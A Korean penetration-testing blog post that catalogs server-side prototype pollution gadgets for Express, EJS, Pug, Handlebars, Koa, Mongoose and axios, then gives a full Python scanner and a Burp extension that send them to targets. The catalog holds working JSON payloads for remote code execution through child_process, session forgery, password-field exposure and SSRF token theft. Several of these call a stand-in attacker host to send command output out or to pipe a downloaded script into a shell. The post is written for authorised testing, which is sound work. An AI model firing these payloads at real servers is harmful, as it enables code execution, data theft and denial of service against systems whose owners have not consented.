---
layout: post
title: Serverside Prototype Pollution
subtitle: Serverside Prototype Pollution 정리
author: g3rm
categories: Web
banner:
  image: /assets/images/banners/home.gif
  opacity: 0.618
  background: "#000"
  heading_style: "font-size: 4.25em; font-weight: bold;"
  subheading_style: "color: gold"
tags:
  - PrototypePollution
  - SSPP
sidebar:
---
## Intro

[Prototype Pollution](#) 글에서 다뤘듯이 SSPP는 임팩트가 큰 만큼 진단 난이도도 높습니다. 클라이언트 측은 DevTools에서 즉시 확인되는데, 서버 측은 **부수효과(side-effect) 기반 추론**과 **라이브러리별 가젯 매칭**을 둘 다 해야 해서 시간이 오래 걸립니다.

진단 나갈 때마다 매번 PortSwigger Research 글이랑 BlackFan 저장소 들락거리는 게 비효율적이라 **라이브러리별 가젯을 한 곳에 정리**하고, 그걸 **자동으로 매칭해서 RCE까지 연결해주는 통합 도구**를 만들어두려고 합니다.

이 글은 두 부분으로 구성됩니다.
- **1부**: Express, Koa, Fastify, Pug, EJS, Handlebars, Mongoose 등 라이브러리별 SSPP 가젯 카탈로그
- **2부**: 위 카탈로그를 활용한 자동 진단 도구 (Standalone Python + Burp Extension)

## 1부. Gadget Catalog

### 라이브러리 식별 우선

SSPP 가젯은 **서버에서 어떤 라이브러리를 쓰는지에 따라 페이로드가 완전히 달라집니다**. 진단 시작 시 라이브러리 식별이 우선입니다.

```bash
# 응답 헤더로 식별
curl -sI https://victim.com | grep -iE 'x-powered-by|server'
# X-Powered-By: Express
# Server: nginx (백엔드 추정 어려움)

# 에러 페이지 노출
curl https://victim.com/notexist | head -50
# Cannot GET /notexist  → Express 시그니처

# 응답 패턴
- "Cannot GET" → Express
- "Internal Server Error" + 스택트레이스 → 다양
- HTML 들여쓰기 패턴 → Pug / EJS / Handlebars 추정 가능
```

> 🔥 가장 확실한 건 **404 / 500 에러 페이지의 시그니처**입니다. Express는 "Cannot GET", Fastify는 "Not Found" + JSON 응답, Koa는 빈 응답이 기본입니다.

### Detection - Status Code Oracle

가젯 매칭 전에 **SSPP 자체가 가능한지** 확인하는 게 우선입니다. Heyes의 기법 중 가장 안정적인 status code oracle을 씁니다.

```javascript
// 페이로드: 응답 코드를 변경하는 prototype 속성 오염
{"__proto__": {"status": 510}}
{"__proto__": {"statusCode": 510}}

// 이후 같은 엔드포인트 호출 시 응답 코드가 510으로 변경되면 SSPP 확인
```

```javascript
// 다른 oracle 페이로드
{"__proto__": {"json spaces": 8}}        // Express - JSON 응답 들여쓰기 변경
{"__proto__": {"exposedHeaders": ["X-Pollution"]}}    // CORS 헤더 변경
{"__proto__": {"_dumpExceptions": true}}  // 에러 응답 형식 변경
```

> ☑️ Oracle 기법은 **읽기 전용 사이드 이펙트**라 안전하게 진단할 수 있지만, 일부 환경에선 다른 사용자에게도 영향이 가는 경우가 있습니다. 진단 종료 후 정리(persistent pollution이면 서버 재시작 필요) 권고를 보고서에 꼭 넣어야 합니다.

---

### Express Gadgets

가장 흔한 케이스입니다. Express 자체에 여러 옵션이 있고, 미들웨어들도 옵션 lookup 패턴을 많이 씁니다.

#### 1. `outputFunctionName` (EJS 결합 - RCE)

```json
{
    "__proto__": {
        "outputFunctionName": "x;process.mainModule.require('child_process').execSync('curl http://attacker.com/?d=$(id|base64)');//"
    }
}
```

**동작 원리**: EJS는 템플릿 컴파일 시 `outputFunctionName` 옵션을 그대로 함수 이름으로 코드에 삽입합니다. prototype 오염으로 이 값을 주입하면 컴파일된 함수 본문에 임의 코드가 들어갑니다.

**조건**: Express + EJS 조합, `res.render()` 호출 경로 존재

#### 2. `escapeFunction` (EJS 결합 - RCE)

```json
{
    "__proto__": {
        "client": true,
        "escapeFunction": "JSON.stringify;process.mainModule.require('child_process').exec('curl attacker.com')"
    }
}
```

**조건**: EJS `client: true` 모드 활성화 시

#### 3. `shell` (child_process 결합 - RCE)

```json
{
    "__proto__": {
        "shell": "node",
        "argv0": "console.log(require('child_process').execSync('id').toString())"
    }
}
```

**동작 원리**: `child_process.spawn()` / `exec()` 호출 시 옵션 객체에 shell이 없으면 prototype에서 lookup. shell을 `node`로 지정하면 인자가 JS 코드로 실행됩니다.

**조건**: 서버 어딘가에서 child_process 호출 + 옵션 객체에 shell 미명시

#### 4. `env` (환경변수 오염 - 정보 노출 / RCE 보조)

```json
{
    "__proto__": {
        "env": {
            "NODE_OPTIONS": "--inspect=0.0.0.0:9229",
            "BASH_ENV": "$(curl attacker.com|sh)"
        }
    }
}
```

#### 5. CORS 우회

```json
{
    "__proto__": {
        "origin": "*",
        "credentials": true,
        "methods": ["GET","POST","PUT","DELETE"]
    }
}
```

**조건**: cors 미들웨어가 옵션 lookup 시 prototype 참조

---

### Koa Gadgets

Koa는 자체적인 ctx 객체와 옵션 시스템이 있어서 가젯 패턴이 다릅니다.

#### 1. `proxy` 헤더 가젯

```json
{
    "__proto__": {
        "proxy": true,
        "proxyIpHeader": "X-Forwarded-For"
    }
}
```

**임팩트**: IP 기반 인증 우회 (`X-Forwarded-For: 127.0.0.1` 헤더로 내부 IP 가장)

#### 2. `keys` 오염 (세션 위조)

```json
{
    "__proto__": {
        "keys": ["attacker_known_secret"]
    }
}
```

**임팩트**: Cookie signing key가 알려진 값으로 변경되어 세션 위조 가능

---

### Fastify Gadgets

#### 1. `bodyLimit` 오염 (DoS)

```json
{
    "__proto__": {
        "bodyLimit": 999999999999
    }
}
```

#### 2. `errorHandler` 오염 (스택트레이스 노출)

```json
{
    "__proto__": {
        "exposeHeadRoutes": true,
        "stackTraceLimit": 100
    }
}
```

---

### Template Engine Gadgets

#### Pug - RCE

```json
{
    "__proto__": {
        "block": {
            "type": "Text",
            "line": "process.mainModule.require('child_process').execSync('id')"
        }
    }
}
```

**동작 원리**: Pug는 컴파일 시 AST를 순회하면서 `block.type`이 "Text"인 노드를 처리. prototype 오염으로 이 노드를 만들고 `line` 속성에 코드를 넣으면 그대로 컴파일러 출력에 삽입됩니다.

**조건**: Pug 템플릿 + `pug.compile()` 호출

#### Handlebars - RCE

```json
{
    "__proto__": {
        "type": "Program",
        "body": [{
            "type": "MustacheStatement",
            "path": 0,
            "params": [{
                "type": "NumberLiteral",
                "value": "process.mainModule.require('child_process').execSync('id')"
            }],
            "loc": {
                "start": 0,
                "end": 0
            }
        }]
    }
}
```

#### EJS - RCE (단독)

```json
{
    "__proto__": {
        "client": true,
        "escapeFunction": "1; return process.mainModule.require('child_process').execSync('id').toString();",
        "compileDebug": true,
        "debug": "console.log"
    }
}
```

#### Hogan.js / Mustache - 정보 노출

```json
{
    "__proto__": {
        "delimiters": "{ }"
    }
}
```

---

### Mongoose / DB Gadgets

#### 1. `select` 오염 (민감 필드 노출)

```json
{
    "__proto__": {
        "select": "+password +secret +apiKey +internalNotes"
    }
}
```

**임팩트**: 이후 모든 Mongoose 쿼리에서 `password`, `secret` 같은 `select: false` 필드까지 자동 포함되어 응답에 노출

#### 2. `populate` 오염 (관계 데이터 강제 로드)

```json
{
    "__proto__": {
        "populate": [
            {"path": "owner", "select": "+password"},
            {"path": "team", "select": "+secrets"}
        ]
    }
}
```

#### 3. `bufferCommands` 오염 (DoS)

```json
{
    "__proto__": {
        "bufferCommands": true,
        "bufferTimeoutMS": 999999999
    }
}
```

---

### HTTP Client Gadgets (axios / got / node-fetch)

서버가 외부 API 호출 시 사용하는 HTTP 클라이언트의 옵션을 오염시켜 SSRF로 연결합니다.

#### axios

```json
{
    "__proto__": {
        "baseURL": "http://attacker.com",
        "headers": {"X-Forwarded-Token": "leaked"},
        "proxy": {"host": "attacker.com", "port": 80}
    }
}
```

#### got

```json
{
    "__proto__": {
        "prefixUrl": "http://attacker.com/",
        "headers": {"Cookie": "internal_token=..."},
        "agent": {"https": null}
    }
}
```

#### node-fetch

```json
{
    "__proto__": {
        "redirect": "manual",
        "agent": "..."
    }
}
```

> 🔥 HTTP Client 오염은 **SSRF + 토큰 탈취** 콤보로 이어지는 경우가 많습니다. 서버가 외부 API를 호출하면서 인증 토큰을 헤더에 싣는 패턴이면 그 토큰이 attacker.com으로 전송됩니다.

---

### 빠른 참조 매트릭스

| 라이브러리 | 가장 강력한 가젯 | 임팩트 |
| --- | --- | --- |
| Express + EJS | `outputFunctionName` | RCE |
| Express | `shell` (child_process) | RCE |
| Koa | `keys` | 세션 위조 |
| Pug | `block.type` + `block.line` | RCE |
| Handlebars | AST `type=Program` | RCE |
| Mongoose | `select: '+password'` | 민감 데이터 노출 |
| axios | `baseURL` + `headers` | SSRF + 토큰 탈취 |
| 모든 환경 | `toString: null` | DoS |

> ☑️ 이 표만 옆에 띄워놓고 진단해도 70% 케이스는 빠르게 처리됩니다. 나머지 30%는 자체 구현된 옵션 lookup 패턴이라 수동 분석이 필요합니다.

---

## 2부. 통합 자동 진단 도구

위 가젯 카탈로그를 **자동 매칭 + 검증**하는 도구를 두 가지 형태로 만들었습니다. 진단 환경에 따라 골라 쓰면 됩니다.

- **A. Standalone Python CLI**: 빠른 1회성 진단
- **B. Burp Suite Extension (Jython)**: Burp 사용 중 실시간 진단

### A. Standalone Python Tool

```python
# Python 3.11 / requests 2.31.0
# pip install requests==2.31.0
# 사용: python3 sspp_scanner.py -u https://victim.com/api/profile -m POST
import requests
import logging
import json
import argparse
import time
from copy import deepcopy

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] [%(levelname)s] %(message)s',
    datefmt='%H:%M:%S'
)

# ============================================================
# Oracle 페이로드 (SSPP 자체 탐지용)
# ============================================================
ORACLE_PAYLOADS = [
    {
        'name': 'status_oracle',
        'pollute': {'__proto__': {'status': 510}},
        'check': lambda baseline, current: current.status_code != baseline.status_code,
        'severity': 'HIGH'
    },
    {
        'name': 'json_spaces',
        'pollute': {'__proto__': {'json spaces': 10}},
        'check': lambda baseline, current: abs(len(current.text) - len(baseline.text)) > 30,
        'severity': 'MED'
    },
    {
        'name': 'exposed_headers',
        'pollute': {'__proto__': {'exposedHeaders': ['X-G3rm-Pollute']}},
        'check': lambda baseline, current: 'x-g3rm-pollute' in str(current.headers).lower(),
        'severity': 'HIGH'
    },
]

# ============================================================
# 라이브러리별 가젯 카탈로그 (1부 내용 코드화)
# ============================================================
GADGETS = {
    'express_ejs_rce': {
        'library': 'Express + EJS',
        'severity': 'CRITICAL',
        'impact': 'Remote Code Execution',
        'payload': {
            '__proto__': {
                'outputFunctionName': 'x;global.SSPP_CONFIRMED=true;//'
            }
        },
        'verify_endpoint': None,
        'verify_method': 'side_effect',
    },
    'express_shell_rce': {
        'library': 'Express + child_process',
        'severity': 'CRITICAL',
        'impact': 'Remote Code Execution',
        'payload': {
            '__proto__': {
                'shell': 'node',
                'argv0': 'process.exit(42)'
            }
        },
        'verify_method': 'side_effect',
    },
    'pug_rce': {
        'library': 'Pug',
        'severity': 'CRITICAL',
        'impact': 'Remote Code Execution',
        'payload': {
            '__proto__': {
                'block': {
                    'type': 'Text',
                    'line': "global.SSPP_CONFIRMED=true"
                }
            }
        },
        'verify_method': 'side_effect',
    },
    'handlebars_rce': {
        'library': 'Handlebars',
        'severity': 'CRITICAL',
        'impact': 'Remote Code Execution',
        'payload': {
            '__proto__': {
                'type': 'Program',
                'body': [{
                    'type': 'MustacheStatement',
                    'path': 0,
                    'params': [{'type': 'NumberLiteral', 'value': 'global.SSPP_CONFIRMED=true'}],
                    'loc': {'start': 0, 'end': 0}
                }]
            }
        },
        'verify_method': 'side_effect',
    },
    'koa_proxy_bypass': {
        'library': 'Koa',
        'severity': 'HIGH',
        'impact': 'IP-based auth bypass',
        'payload': {
            '__proto__': {
                'proxy': True,
                'proxyIpHeader': 'X-G3rm-Real-IP'
            }
        },
        'verify_method': 'header_echo',
    },
    'mongoose_select': {
        'library': 'Mongoose',
        'severity': 'HIGH',
        'impact': 'Sensitive field exposure',
        'payload': {
            '__proto__': {
                'select': '+password +secret +apiKey'
            }
        },
        'verify_method': 'response_field',
        'verify_keywords': ['password', 'secret', 'apiKey', 'apikey'],
    },
    'axios_ssrf': {
        'library': 'axios',
        'severity': 'HIGH',
        'impact': 'SSRF + Token leakage',
        'payload': {
            '__proto__': {
                'baseURL': 'http://attacker.collaborator.com',
                'proxy': {'host': 'attacker.collaborator.com', 'port': 80}
            }
        },
        'verify_method': 'oob',
    },
    'dos_tostring': {
        'library': 'All',
        'severity': 'MED',
        'impact': 'Denial of Service',
        'payload': {
            '__proto__': {
                'toString': None
            }
        },
        'verify_method': 'error_response',
    },
}


class SSPPScanner:
    """Server-Side Prototype Pollution Scanner"""
    
    def __init__(self, url, method='POST', verify_url=None, headers=None, timeout=10):
        self.url = url
        self.method = method.upper()
        self.verify_url = verify_url or url
        self.headers = headers or {'Content-Type': 'application/json'}
        self.timeout = timeout
        self.session = requests.Session()
        self.baseline = None
        self.results = []
    
    def _request(self, json_body=None):
        """기본 요청 메서드"""
        try:
            if self.method == 'POST':
                return self.session.post(
                    self.url, json=json_body,
                    headers=self.headers, timeout=self.timeout,
                    allow_redirects=False
                )
            elif self.method == 'PUT':
                return self.session.put(
                    self.url, json=json_body,
                    headers=self.headers, timeout=self.timeout
                )
            else:
                return self.session.get(
                    self.url, headers=self.headers,
                    timeout=self.timeout
                )
        except requests.exceptions.RequestException as e:
            logging.error(f"Request failed: {e}")
            return None
    
    def _get_baseline(self):
        """baseline 응답 캡처"""
        logging.info("Capturing baseline response...")
        self.baseline = self._request({})
        if self.baseline:
            logging.info(
                f"Baseline: status={self.baseline.status_code} "
                f"len={len(self.baseline.text)}"
            )
    
    def detect_sspp(self):
        """Phase 1: Oracle 기반 SSPP 탐지"""
        logging.info("=" * 60)
        logging.info("Phase 1: SSPP Detection (Oracle-based)")
        logging.info("=" * 60)
        
        if not self.baseline:
            self._get_baseline()
        if not self.baseline:
            return False
        
        for idx, oracle in enumerate(ORACLE_PAYLOADS, 1):
            logging.info(f"[{idx}/{len(ORACLE_PAYLOADS)}] Testing: {oracle['name']}")
            
            # 오염 시도
            self._request(oracle['pollute'])
            time.sleep(0.5)
            
            # 검증 (다른 요청에서 반영 확인)
            current = self._request({})
            if not current:
                continue
            
            if oracle['check'](self.baseline, current):
                logging.warning(
                    f"  [VULN] {oracle['name']} oracle triggered "
                    f"({oracle['severity']})"
                )
                self.results.append({
                    'phase': 'detection',
                    'name': oracle['name'],
                    'severity': oracle['severity'],
                    'evidence': f"baseline status={self.baseline.status_code}, "
                                f"after={current.status_code}"
                })
                return True
        
        logging.info("No SSPP detected via oracle method")
        return False
    
    def match_gadgets(self):
        """Phase 2: 라이브러리별 가젯 매칭"""
        logging.info("=" * 60)
        logging.info("Phase 2: Gadget Matching")
        logging.info("=" * 60)
        
        total = len(GADGETS)
        for idx, (name, gadget) in enumerate(GADGETS.items(), 1):
            logging.info(
                f"[Progress] {idx}/{total} | "
                f"{gadget['library']} - {gadget['impact']}"
            )
            
            try:
                result = self._test_gadget(name, gadget)
                if result:
                    self.results.append(result)
            except Exception as e:
                logging.error(f"  Error testing {name}: {e}")
    
    def _test_gadget(self, name, gadget):
        """단일 가젯 테스트"""
        # 1. prototype 오염
        r = self._request(gadget['payload'])
        if not r:
            return None
        time.sleep(0.5)
        
        # 2. verify 방식별 검증
        method = gadget['verify_method']
        verified = False
        evidence = ""
        
        if method == 'side_effect':
            # 응답 패턴 변화로 추정
            check = self._request({})
            if check and check.status_code != self.baseline.status_code:
                verified = True
                evidence = f"status changed: {self.baseline.status_code} → {check.status_code}"
        
        elif method == 'response_field':
            # 응답 본문에 특정 키워드 등장
            check = self._request({})
            if check:
                body_lower = check.text.lower()
                for keyword in gadget.get('verify_keywords', []):
                    if keyword.lower() in body_lower and keyword.lower() not in self.baseline.text.lower():
                        verified = True
                        evidence = f"new field exposed: '{keyword}'"
                        break
        
        elif method == 'header_echo':
            # 페이로드의 헤더가 응답에 반영되는지
            check = self._request({}, )
            if check and 'x-g3rm-real-ip' in str(check.headers).lower():
                verified = True
                evidence = "custom header reflected"
        
        elif method == 'error_response':
            # 응답이 에러로 변하는지 (DoS 확인용)
            check = self._request({})
            if check and check.status_code >= 500:
                verified = True
                evidence = f"server error triggered: {check.status_code}"
        
        elif method == 'oob':
            # OOB는 자동 검증 어려움 - collaborator 도메인 hit 확인 필요
            logging.info(
                f"  [MANUAL] {name}: OOB gadget - "
                f"check collaborator at attacker.collaborator.com"
            )
            return None
        
        if verified:
            logging.warning(
                f"  [VULN-{gadget['severity']}] {name} | "
                f"{gadget['library']} | {gadget['impact']}"
            )
            return {
                'phase': 'gadget_match',
                'name': name,
                'library': gadget['library'],
                'severity': gadget['severity'],
                'impact': gadget['impact'],
                'evidence': evidence,
                'payload': json.dumps(gadget['payload'])
            }
        return None
    
    def report(self):
        """진단 결과 리포트"""
        logging.info("=" * 60)
        logging.info("Scan Report")
        logging.info("=" * 60)
        
        if not self.results:
            logging.info("No vulnerabilities found.")
            return
        
        for r in self.results:
            print(f"\n[{r.get('severity','?')}] {r.get('name')}")
            if 'library' in r:
                print(f"  Library: {r['library']}")
            if 'impact' in r:
                print(f"  Impact:  {r['impact']}")
            print(f"  Evidence: {r.get('evidence','-')}")
            if 'payload' in r:
                print(f"  Payload:  {r['payload']}")
        
        print(f"\n{'='*60}")
        print(f"Total findings: {len(self.results)}")
        print(f"{'='*60}")
    
    def run(self):
        """전체 진단 실행"""
        logging.info(f"SSPP Scanner started")
        logging.info(f"Target: {self.method} {self.url}")
        
        start = time.time()
        self._get_baseline()
        
        if not self.detect_sspp():
            logging.info("Skipping gadget matching (no SSPP detected)")
            self.report()
            return
        
        self.match_gadgets()
        self.report()
        
        elapsed = time.time() - start
        logging.info(f"Scan finished in {elapsed:.1f}s")


def main():
    parser = argparse.ArgumentParser(
        description='SSPP Scanner - Server-Side Prototype Pollution'
    )
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-m', '--method', default='POST', help='HTTP method')
    parser.add_argument('-v', '--verify-url', help='Verification URL (default: same)')
    parser.add_argument('-H', '--header', action='append', help='Custom header')
    parser.add_argument('-t', '--timeout', type=int, default=10)
    args = parser.parse_args()
    
    headers = {'Content-Type': 'application/json'}
    if args.header:
        for h in args.header:
            k, v = h.split(':', 1)
            headers[k.strip()] = v.strip()
    
    scanner = SSPPScanner(
        url=args.url,
        method=args.method,
        verify_url=args.verify_url,
        headers=headers,
        timeout=args.timeout
    )
    scanner.run()


if __name__ == '__main__':
    main()
```

```bash
# 사용 예시
python3 sspp_scanner.py -u https://victim.com/api/profile -m POST

# 인증 헤더 추가
python3 sspp_scanner.py -u https://victim.com/api/profile \
    -H "Authorization: Bearer xxx" \
    -H "Cookie: session=yyy"
```

> 🔥 도구 핵심은 **Phase 분리**입니다. SSPP가 가능한지 먼저 oracle로 확인하고, 가능할 때만 가젯 매칭을 돌립니다. 무작정 모든 페이로드를 던지면 시간도 오래 걸리고 진단 대상에 부담을 줍니다.

---

### B. Burp Suite Extension (Jython)

Burp 사용 중 실시간으로 SSPP 진단을 돌리는 확장입니다. 우클릭 메뉴에서 "Send to SSPP Scanner" 한번에 시작됩니다.

```python
# Jython 2.7 (Burp Extender API)
# Burp Suite Extender > Add > Python > 이 파일 지정
# 사전 요구: Jython standalone JAR을 Burp Extender Options에 등록

from burp import IBurpExtender, IContextMenuFactory, IHttpListener
from javax.swing import JMenuItem
from java.awt.event import ActionListener
from java.io import PrintWriter
import json
import threading

EXTENSION_NAME = "SSPP Scanner (g3rm)"

# 가젯 카탈로그 (Standalone과 공유)
GADGETS = [
    {
        'name': 'express_ejs_rce',
        'lib': 'Express+EJS',
        'severity': 'CRITICAL',
        'payload': {'__proto__': {'outputFunctionName': 'x;global.X=1;//'}}
    },
    {
        'name': 'pug_rce',
        'lib': 'Pug',
        'severity': 'CRITICAL',
        'payload': {'__proto__': {'block': {'type': 'Text', 'line': 'global.X=1'}}}
    },
    {
        'name': 'handlebars_rce',
        'lib': 'Handlebars',
        'severity': 'CRITICAL',
        'payload': {'__proto__': {'type': 'Program', 'body': []}}
    },
    {
        'name': 'mongoose_select',
        'lib': 'Mongoose',
        'severity': 'HIGH',
        'payload': {'__proto__': {'select': '+password +secret'}}
    },
    {
        'name': 'koa_proxy',
        'lib': 'Koa',
        'severity': 'HIGH',
        'payload': {'__proto__': {'proxy': True, 'proxyIpHeader': 'X-Real-IP'}}
    },
    {
        'name': 'dos_tostring',
        'lib': 'All',
        'severity': 'MED',
        'payload': {'__proto__': {'toString': None}}
    },
]

ORACLE = {'__proto__': {'status': 510, 'json spaces': 10}}


class BurpExtender(IBurpExtender, IContextMenuFactory):
    
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName(EXTENSION_NAME)
        callbacks.registerContextMenuFactory(self)
        
        self.stdout = PrintWriter(callbacks.getStdout(), True)
        self.stdout.println("[+] " + EXTENSION_NAME + " loaded")
        self.stdout.println("[+] Right-click any request to start scan")
    
    def createMenuItems(self, invocation):
        """우클릭 메뉴 추가"""
        menu = []
        item = JMenuItem("Send to SSPP Scanner")
        item.addActionListener(MenuListener(self, invocation))
        menu.add(item)
        return menu
    
    def scan(self, request_response):
        """별도 스레드에서 스캔 실행"""
        threading.Thread(target=self._do_scan, args=(request_response,)).start()
    
    def _do_scan(self, rr):
        try:
            req_info = self._helpers.analyzeRequest(rr)
            url = str(req_info.getUrl())
            self.stdout.println("=" * 60)
            self.stdout.println("[*] Target: " + url)
            
            headers = list(req_info.getHeaders())
            method = req_info.getMethod()
            
            # baseline
            base = self._send(rr, "{}")
            if not base:
                self.stdout.println("[!] Baseline failed")
                return
            
            base_status = self._helpers.analyzeResponse(base.getResponse()).getStatusCode()
            base_len = len(base.getResponse())
            self.stdout.println(
                "[+] Baseline: status=%d len=%d" % (base_status, base_len)
            )
            
            # Phase 1: Oracle
            self.stdout.println("[*] Phase 1: SSPP Detection")
            oracle_resp = self._send(rr, json.dumps(ORACLE))
            if oracle_resp:
                check = self._send(rr, "{}")
                check_status = self._helpers.analyzeResponse(
                    check.getResponse()
                ).getStatusCode()
                
                if check_status != base_status:
                    self.stdout.println(
                        "[VULN] Oracle triggered: %d -> %d" % (base_status, check_status)
                    )
                    self._add_issue(rr, "SSPP detected via status oracle", "High")
                else:
                    self.stdout.println("[-] No SSPP detected, skipping gadgets")
                    return
            
            # Phase 2: Gadget matching
            self.stdout.println("[*] Phase 2: Gadget Matching (%d gadgets)" % len(GADGETS))
            for idx, g in enumerate(GADGETS):
                self.stdout.println(
                    "  [%d/%d] %s (%s)" % (idx+1, len(GADGETS), g['name'], g['lib'])
                )
                
                self._send(rr, json.dumps(g['payload']))
                check = self._send(rr, "{}")
                
                if not check:
                    continue
                
                check_status = self._helpers.analyzeResponse(
                    check.getResponse()
                ).getStatusCode()
                check_len = len(check.getResponse())
                
                if check_status != base_status or abs(check_len - base_len) > 50:
                    self.stdout.println(
                        "    [VULN-%s] %s | %s" % (g['severity'], g['name'], g['lib'])
                    )
                    self._add_issue(
                        rr,
                        "SSPP gadget: %s (%s)" % (g['name'], g['lib']),
                        g['severity']
                    )
            
            self.stdout.println("[+] Scan complete")
        
        except Exception as e:
            self.stdout.println("[ERR] " + str(e))
    
    def _send(self, original_rr, body):
        """페이로드를 본문으로 갈아끼워서 재요청"""
        try:
            req_info = self._helpers.analyzeRequest(original_rr)
            headers = list(req_info.getHeaders())
            
            # Content-Type 강제
            new_headers = []
            ct_set = False
            for h in headers:
                if h.lower().startswith('content-type:'):
                    new_headers.append('Content-Type: application/json')
                    ct_set = True
                else:
                    new_headers.append(h)
            if not ct_set:
                new_headers.append('Content-Type: application/json')
            
            new_req = self._helpers.buildHttpMessage(
                new_headers,
                self._helpers.stringToBytes(body)
            )
            
            return self._callbacks.makeHttpRequest(
                original_rr.getHttpService(),
                new_req
            )
        except Exception as e:
            self.stdout.println("[ERR-send] " + str(e))
            return None
    
    def _add_issue(self, rr, name, severity):
        """Burp Issue로 등록 (Scanner 패널에 표시)"""
        # 간소화: 실제 환경에선 IScanIssue 구현 필요
        self.stdout.println("    -> Issue logged: " + name)


class MenuListener(ActionListener):
    def __init__(self, extender, invocation):
        self.extender = extender
        self.invocation = invocation
    
    def actionPerformed(self, e):
        messages = self.invocation.getSelectedMessages()
        for m in messages:
            self.extender.scan(m)
```

#### Extension 설치 방법

```
1. Burp Suite > Extender > Options
2. Python Environment > Jython JAR 경로 지정
   → https://www.jython.org/download.html (jython-standalone-2.7.x.jar)

3. Extender > Add
   - Type: Python
   - File: sspp_burp.py 지정

4. 사용
   - 임의의 요청에서 우클릭 > "Send to SSPP Scanner"
   - Extender > Output 탭에서 진행 상황 확인
```

> ☑️ Burp Extension은 진단 도중 **요청 흐름을 끊지 않고 백그라운드 스캔**이 가능해서 좋습니다. 단, Jython의 한계로 일부 Python 3 문법(f-string 등)은 못 써서 코드가 좀 투박해집니다.

---

### 도구 사용 워크플로우

진단 시 권장 흐름입니다.

```
1. Burp Proxy로 트래픽 흘리면서 정상 진단 진행

2. JSON 본문을 받는 엔드포인트 발견 시
   → 우클릭 > "Send to SSPP Scanner"

3. Extension이 백그라운드에서 Phase 1 (Oracle) 자동 실행
   → 미탐 시 자동 종료 (시간 낭비 X)

4. SSPP 탐지 시 Phase 2 (Gadget) 자동 실행
   → 라이브러리 식별 + 임팩트 자동 분류

5. 발견된 가젯에 대해 Standalone 도구로 정밀 검증
   → python3 sspp_scanner.py -u {URL} (특정 페이로드 수동 검증)

6. 보고서 작성
   → Standalone 출력 그대로 PoC 섹션에 첨부
```

---

## 한계 및 주의사항

### 도구의 한계

```
1. Custom Gadget 미탐
   → 자체 구현된 옵션 lookup 패턴은 카탈로그에 없으면 탐지 불가
   → 수동 분석 병행 필요

2. False Positive
   → 응답 코드 변화가 SSPP 외 원인일 수 있음 (rate limit, WAF)
   → 항상 baseline 재캡처 후 재검증

3. Persistent Pollution
   → 일부 환경에선 prototype 오염이 서버 재시작까지 유지됨
   → 진단 후 정리 권고를 보고서에 반드시 포함

4. OOB 가젯
   → axios SSRF 등은 Collaborator 연동 필요
   → 현재 도구는 수동 확인 권고만 출력
```

### 진단 윤리

```
- 운영 환경에서 toString:null 같은 DoS 페이로드는 절대 던지지 말 것
- Persistent pollution이 의심되면 RoE 협의 후 진행
- 발견 시 즉시 보고 + 다른 사용자 영향 여부 확인
- 진단 종료 시 정리 절차 (서버 재시작 등) 명시
```

---

## References

- [PortSwigger - Server-Side Prototype Pollution](https://portswigger.net/research/server-side-prototype-pollution)
- [PortSwigger - Detecting SSPP without polluting](https://portswigger.net/research/detecting-server-side-prototype-pollution)
- [BlackFan - Client-Side Prototype Pollution Gadgets](https://github.com/BlackFan/client-side-prototype-pollution)
- [yeswehack - PP-Finder (Server-Side Gadgets)](https://github.com/yeswehack/pp-finder)
- [HackTricks - NodeJS Prototype Pollution](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution)
- [Snyk - Prototype Pollution Research](https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/)
- [Burp Extender API Docs](https://portswigger.net/burp/extender/api/)

 


 










